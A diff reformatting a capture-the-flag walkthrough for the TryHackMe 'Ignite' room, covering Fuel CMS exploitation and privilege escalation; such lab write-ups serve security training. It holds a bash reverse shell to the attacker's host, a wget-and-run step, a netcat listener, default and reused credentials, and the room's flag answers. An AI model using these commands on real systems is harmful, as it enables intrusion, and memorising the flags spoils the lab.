@@ -1,12 +1,12 @@
 # Ignite
 
-![tryhackme.com - © TryHackMe](.gitbook/assets/tryhackme-logo-small.png)
+![tryhackme.com - © TryHackMe](<../../learn/.gitbook/assets/tryhackme-logo-small (1).png>)
 
 > 🔬🌐 [Ignite](https://tryhackme.com/room/ignite)
 >
-> *A new start-up has a few issues with their web server.*
+> _A new start-up has a few issues with their web server._
 >
-> ![](.gitbook/assets/ignite.png)
+> <img src=".gitbook/assets/ignite.png" alt="" data-size="original">
 
 🎯 Target IP: `10.10.174.21`
 
@@ -33,13 +33,13 @@ PORT   STATE SERVICE VERSION
 
 Navigate to
 
-- `http://10.10.174.21/`
-- `http://10.10.174.21/fuel`
-  - `admin`:`admin`
+* `http://10.10.174.21/`
+* `http://10.10.174.21/fuel`
+  * `admin`:`admin`
 
 ## Exploitation
 
-- Search for a Fuel CMS exploit
+* Search for a Fuel CMS exploit
 
 ```bash
 searchsploit fuel cms
@@ -69,7 +69,7 @@ subl shell.sh
 /bin/bash -i >& /dev/tcp/10.18.65.48/3333 0>&1
 ```
 
-- Setup a Python web server and a `nc` listener on 2 different tabs
+* Setup a Python web server and a `nc` listener on 2 different tabs
 
 ```bash
 python -m http.server
@@ -77,14 +77,14 @@ python -m http.server
 nc -nvlp 3333
 ```
 
-- Back in the exploited Fuel CMS `Enter Command $`
+* Back in the exploited Fuel CMS `Enter Command $`
 
 ```bash
 wget http://10.18.65.48:8000/shell.sh -O shell.sh
 bash shell.sh
 ```
 
-- Reverse shell received in the `nc` terminal
+* Reverse shell received in the `nc` terminal
 
 ```bash
 /usr/bin/script -qc /bin/bash /dev/null
@@ -93,25 +93,20 @@ ls
 cat flag.txt
 ```
 
-
-
 <details>
-<summary>Reveal Flag - user.txt: 🚩</summary>
 
+<summary>Reveal Flag - user.txt: 🚩</summary>
 
 `6470e394cbf6dab6a91682cc8585059b`
 
-![](.gitbook/assets/image-20230511171954548.png)
+<img src=".gitbook/assets/image-20230511171954548.png" alt="" data-size="original">
 
 </details>
 
-
-
 ## Privilege Escalation
 
-- Enumerate Fuel CMS application
-  - `/var/www/html/fuel/application/config/`
-
+* Enumerate Fuel CMS application
+  * `/var/www/html/fuel/application/config/`
 
 ```bash
 cat /var/www/html/fuel/application/config/database.php
@@ -143,7 +138,7 @@ $db['default'] = array(
 
 > 📌 Found database credentials: `root`:`mememe`
 
-- Try to use those credentials for the `root` user of the system
+* Try to use those credentials for the `root` user of the system
 
 ```bash
 su root
@@ -153,19 +148,14 @@ cd
 cat root.txt
 ```
 
-
-
 <details>
-<summary>Reveal Flag - root.txt: 🚩</summary>
 
+<summary>Reveal Flag - root.txt: 🚩</summary>
 
 `b9bbcb33e11b80be759c4e844862482`
 
-![](.gitbook/assets/image-20230511175207984.png)
+<img src=".gitbook/assets/image-20230511175207984.png" alt="" data-size="original">
 
 </details>
 
-
-
-------
-
+***
